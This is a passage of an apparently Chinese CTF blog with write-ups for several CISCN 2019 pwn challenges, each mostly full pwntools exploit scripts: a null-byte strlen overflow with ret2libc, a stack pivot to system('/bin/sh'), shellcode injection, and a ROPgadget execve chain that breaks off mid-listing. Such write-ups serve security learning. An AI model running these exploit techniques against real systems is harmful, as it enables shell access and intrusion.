<h3 id="CISCN-2019-东北-PWN2"><a href="#CISCN-2019-东北-PWN2" class="headerlink" title="[CISCN 2019 东北]PWN2"></a>[CISCN 2019 东北]PWN2</h3><h4 id="题目说明-16"><a href="#题目说明-16" class="headerlink" title="题目说明"></a>题目说明</h4><p>strlen+ret2libc</p>
<h4 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h4><p>关键在这里</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/Vq8sbwcaRojgvrxNvh0cddWXnse.png'><img src="/2024/03/15/MyS3andB0x/Vq8sbwcaRojgvrxNvh0cddWXnse.png"></p>
<p>strlen 函数会被\x00 截断，所以截断后再接上 payload 即可造成溢出</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/Irs0bRPTqoErOzx7kJUcslmxn7b.png'><img src="/2024/03/15/MyS3andB0x/Irs0bRPTqoErOzx7kJUcslmxn7b.png"></p>
<p>确认一下没有 canary，后面 ret2libc 就行</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/U7t2b7g6zo8CoWxuD32cqHbtnIb.png'><img src="/2024/03/15/MyS3andB0x/U7t2b7g6zo8CoWxuD32cqHbtnIb.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sgtlibc<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28462</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./[CISCN 2019东北]PWN2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;choice!&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>ret=<span class="hljs-number">0x00000000004006b9</span><br>pop_rdi=<span class="hljs-number">0x0000000000400c83</span><br>main=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span><br>payload+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x57</span><br>payload+=p64(pop_rdi)<br>payload+=p64(puts_got)<br>payload+=p64(puts_plt)<br>payload+=p64(main)<br><br>p.recvuntil(<span class="hljs-string">&#x27;be encrypted&#x27;</span>)<br>p.sendline(payload)<br><br>puts_addr=u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>log.info(<span class="hljs-string">&quot;puts addr is :%x&quot;</span>%puts_addr)<br>s = sgtlibc.Searcher()<br>s.add_condition(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>s.dump(db_index=<span class="hljs-number">2</span>) <span class="hljs-comment"># search libc , if returns multi-result ,default use index-0&#x27;s result</span><br><br>system_addr = s.get_address(sgtlibc.s_system)<br>binsh_addr = s.get_address(sgtlibc.s_binsh)<br>puts_addr_ = s.get_address(sgtlibc.s_puts)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system_addr), <span class="hljs-built_in">hex</span>(binsh_addr), <span class="hljs-built_in">hex</span>(puts_addr_))<br>libc_base = puts_addr - puts_addr_<br>system = libc_base + system_addr<br>bin_sh = libc_base + binsh_addr<br>p.recvuntil(<span class="hljs-string">b&#x27;choice!&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;be encrypted&#x27;</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x57</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(ret)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="CISCN-2019-华中-PWN1"><a href="#CISCN-2019-华中-PWN1" class="headerlink" title="[CISCN 2019 华中]PWN1"></a>[CISCN 2019 华中]PWN1</h3><h4 id="题目说明-17"><a href="#题目说明-17" class="headerlink" title="题目说明"></a>题目说明</h4><p>ret2libc</p>
<h4 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sgtlibc<br><br>io = remote(<span class="hljs-string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28993</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_2019&#x27;</span>)<br><br>pop_rdi_ret = <span class="hljs-number">0x400c83</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>ret_addr = <span class="hljs-number">0x4006b9</span><br>main = <span class="hljs-number">0x400b28</span><br><br>io.sendlineafter(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>payload =<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)<br><br>io.sendlineafter(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br><br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>log.info(<span class="hljs-string">&quot;puts addr is :%x&quot;</span>%puts_addr)<br>s = sgtlibc.Searcher()<br>s.add_condition(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>s.dump(db_index=<span class="hljs-number">2</span>) <span class="hljs-comment"># search libc , if returns multi-result ,default use index-0&#x27;s result</span><br><br>system_addr = s.get_address(sgtlibc.s_system)<br>binsh_addr = s.get_address(sgtlibc.s_binsh)<br>puts_addr_ = s.get_address(sgtlibc.s_puts)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system_addr), <span class="hljs-built_in">hex</span>(binsh_addr), <span class="hljs-built_in">hex</span>(puts_addr_))<br>libc_base = puts_addr - puts_addr_<br>system = libc_base + system_addr<br>bin_sh = libc_base + binsh_addr<br><br>io.sendlineafter(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>payload =<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)<br>io.sendlineafter(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="CISCN-2019-华南-PWN4"><a href="#CISCN-2019-华南-PWN4" class="headerlink" title="[CISCN 2019 华南]PWN4"></a>[CISCN 2019 华南]PWN4</h3><h4 id="题目说明-18"><a href="#题目说明-18" class="headerlink" title="题目说明"></a>题目说明</h4><p>栈迁移（跟上面东南 pwn2 是一样的？）</p>
<h4 id="解题思路-17"><a href="#解题思路-17" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br> <br>p=remote(<span class="hljs-string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28823</span>)<br><span class="hljs-comment"># p=process(&#x27;./hnpwn4&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_2019&#x27;</span>)<br> <br>sys_addr=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x080484b8</span><br> <br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x27</span><br>p.sendlineafter(<span class="hljs-string">&#x27;name?\n&#x27;</span>,payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>oldebp = u32(p.recv(<span class="hljs-number">4</span>))<br> <br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(sys_addr)+p32(<span class="hljs-number">0</span>)+p32(oldebp-<span class="hljs-number">0x28</span>)+<span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload2 = payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>payload2+=p32(oldebp-<span class="hljs-number">0x38</span>)+p32(leave_ret)<br>p.sendlineafter(<span class="hljs-string">&#x27;\n&#x27;</span>,payload2)<br> <br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="CISCN-2019-华北-PWN5"><a href="#CISCN-2019-华北-PWN5" class="headerlink" title="[CISCN 2019 华北]PWN5"></a>[CISCN 2019 华北]PWN5</h3><h4 id="题目说明-19"><a href="#题目说明-19" class="headerlink" title="题目说明"></a>题目说明</h4><p>shellcode</p>
<h4 id="解题思路-18"><a href="#解题思路-18" class="headerlink" title="解题思路"></a>解题思路</h4><p>什么保护都没有</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/DZQxbtVgaoaCXuxnMPpcXqUQnhe.png'><img src="/2024/03/15/MyS3andB0x/DZQxbtVgaoaCXuxnMPpcXqUQnhe.png"></p>
<p>把 shellcode 写在 text 上再跳过去执行就好</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/LMEkbHqUDoc6C1xZD9wc9mQnnAe.png'><img src="/2024/03/15/MyS3andB0x/LMEkbHqUDoc6C1xZD9wc9mQnnAe.png"></p>
<p>给了这么长的空间，这多是一件美事儿啊。直接用 shellcraft</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>io = remote(<span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28920</span>)<br><br>shellcode = asm(shellcraft.sh())<br>io.sendlineafter(<span class="hljs-string">b&#x27;name&#x27;</span>,shellcode)<br><br>name = <span class="hljs-number">0x601080</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p64(name)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;me?\n&#x27;</span>)<br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="CISCN-2019-华南-PWN8"><a href="#CISCN-2019-华南-PWN8" class="headerlink" title="[CISCN 2019 华南]PWN8"></a>[CISCN 2019 华南]PWN8</h3><h4 id="题目说明-20"><a href="#题目说明-20" class="headerlink" title="题目说明"></a>题目说明</h4><p>这道题比较奇妙</p>
<p>我不是很懂这一整个是什么程序</p>
<h4 id="解题思路-19"><a href="#解题思路-19" class="headerlink" title="解题思路"></a>解题思路</h4><p>ida 打开全都是这种 jb 函数，所以靠运行时的字符找主函数（ALT+T）</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/Jbtkb3oUNosUeexNXxlcKKIbnvl.png'><img src="/2024/03/15/MyS3andB0x/Jbtkb3oUNosUeexNXxlcKKIbnvl.png"></p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/TKxNbQKRrovCACxS1fxcQCOxnse.png'><img src="/2024/03/15/MyS3andB0x/TKxNbQKRrovCACxS1fxcQCOxnse.png"></p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/WVSDbwKK5oZnJMxRngWcv8UbnHc.png'><img src="/2024/03/15/MyS3andB0x/WVSDbwKK5oZnJMxRngWcv8UbnHc.png"></p>
<p>找到这里，再跟一下里面几个函数</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/S9c9butpuoGGzaxezomc4RaCnZA.png'><img src="/2024/03/15/MyS3andB0x/S9c9butpuoGGzaxezomc4RaCnZA.png"></p>
<p>sub_410550 就是 printf</p>
<p>sub_449BE0 就是一个 read 函数</p>
<p>重头戏在 sub_400C40：</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/XOKCbvBPto9x7ZxwgfUc1vwKnRl.png'><img src="/2024/03/15/MyS3andB0x/XOKCbvBPto9x7ZxwgfUc1vwKnRl.png"></p>
<p>它会把传入的字符进行异或再返回到“主函数”</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/MDtHbqmLBo0tdRxWxDmcQunMnGf.png'><img src="/2024/03/15/MyS3andB0x/MDtHbqmLBo0tdRxWxDmcQunMnGf.png"></p>
<p>所以我们构造 payload 的时候记得先异或就好了</p>
<p>但是这么多个函数怎么构造 ropchain 呢</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/BERKbgYVeoxXzuxMjozcdQmzneh.png'><img src="/2024/03/15/MyS3andB0x/BERKbgYVeoxXzuxMjozcdQmzneh.png"></p>
<p>是静态链接，我们借用 ROPgadget 完成 ropchain 的构造：</p>
<p>ROPgadget –binary helloworld –ropchain</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python">ROP chain generation<br>===========================================================<br><br>- Step <span class="hljs-number">1</span> -- Write-what-where gadgets<br><br>        [+] Gadget found: <span class="hljs-number">0x47f7b1</span> mov qword ptr [rsi], rax ; ret<br>        [+] Gadget found: <span class="hljs-number">0x4040fe</span> pop rsi ; ret<br>        [+] Gadget found: <span class="hljs-number">0x449b9c</span> pop rax ; ret<br>        [+] Gadget found: <span class="hljs-number">0x444f00</span> xor rax, rax ; ret<br><br>- Step <span class="hljs-number">2</span> -- Init syscall number gadgets<br><br>        [+] Gadget found: <span class="hljs-number">0x444f00</span> xor rax, rax ; ret<br>        [+] Gadget found: <span class="hljs-number">0x474c00</span> add rax, <span class="hljs-number">1</span> ; ret<br>        [+] Gadget found: <span class="hljs-number">0x474c01</span> add eax, <span class="hljs-number">1</span> ; ret<br><br>- Step <span class="hljs-number">3</span> -- Init syscall arguments gadgets<br><br>        [+] Gadget found: <span class="hljs-number">0x4006e6</span> pop rdi ; ret<br>        [+] Gadget found: <span class="hljs-number">0x4040fe</span> pop rsi ; ret<br>        [+] Gadget found: <span class="hljs-number">0x449bf5</span> pop rdx ; ret<br><br>- Step <span class="hljs-number">4</span> -- Syscall gadget<br><br>        [+] Gadget found: <span class="hljs-number">0x40139c</span> syscall<br><br>- Step <span class="hljs-number">5</span> -- Build the ROP chain<br><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># execve generated by ROPgadget</span><br><br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br><span class="hljs-comment"># Padding goes here</span><br>p = <span class="hljs-string">b&#x27;&#x27;</span><br><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004040fe</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006ba0e0</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000449b9c</span>) <span class="hljs-comment"># pop rax ; ret</span><br>p += <span class="hljs-string">b&#x27;/bin//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000047f7b1</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004040fe</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006ba0e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000444f00</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000047f7b1</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004006e6</span>) <span class="hljs-comment"># pop rdi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006ba0e0</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004040fe</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006ba0e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000449bf5</span>) <span class="hljs-comment"># pop rdx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006ba0e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000444f00</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span 